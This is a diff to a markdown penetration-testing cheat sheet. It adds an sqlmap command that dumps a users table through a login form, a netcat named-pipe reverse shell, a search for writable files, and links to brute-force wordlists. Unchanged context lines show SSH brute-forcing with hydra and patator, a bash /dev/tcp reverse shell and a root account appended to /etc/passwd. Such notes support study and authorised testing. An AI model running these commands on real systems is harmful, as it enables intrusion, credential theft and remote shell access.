@@ -47,8 +47,17 @@ hydra -l sunny -p sunday ssh://192.168.172.3:22
 https://www.ihacklabs.com/en/brute-force-with-patator/
 
 ```bash
-patator.py ssh_login host=10.0.0.1 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=’Authentication failed.’
+patator.py ssh_login host=10.0.0.1 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed.'
 ```
+### SQLMap
+```bash
+sqlmap --proxy=http://192.168.172.3:31337 --dbms=mysql --data="user=adm&pass=passw&submit=Login" --url http://127.0.0.1:8080/littlesecrets-main/login.php --level=5 --risk=3 --dump users
+```
+### Useful dictionaries for brute-force
+[Seclist](https://github.com/danielmiessler/SecLists)
+
+[Burp-payload](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad)
+
 ## Privilege Escalation Techniques
 [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 
@@ -68,6 +77,8 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/et
 ### Bash
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 ### Netcat
 ```bash
@@ -121,6 +132,10 @@ $ sudo chmod u+s /usr/bin/whoami # set SUID for whoami
 
 $ sudo chmod u-s /usr/bin/whoami # Unset SUID
 ```
+###Check files with write permission for current user
+```bash
+find / -type f -writable 2>/dev/null -not -path "*/proc/*"
+```
 ### Port and Host IP Scanning without NMap/Permissions
 [No Nmap, No Permissions, No Problem](https://www.lanmaster53.com/2010/04/16/no-nmap-no-permissions-no-problem/)
 ### Escaping restricted shell
@@ -161,5 +176,8 @@ https://youtu.be/3VxZNflJqsw?t=1385
 ## Other tools
 ### Auditing RPMs and OS packages
 https://vulners.com/audit
+
+## Tmux
+https://gist.github.com/MohamedAlaa/2961058
 
 
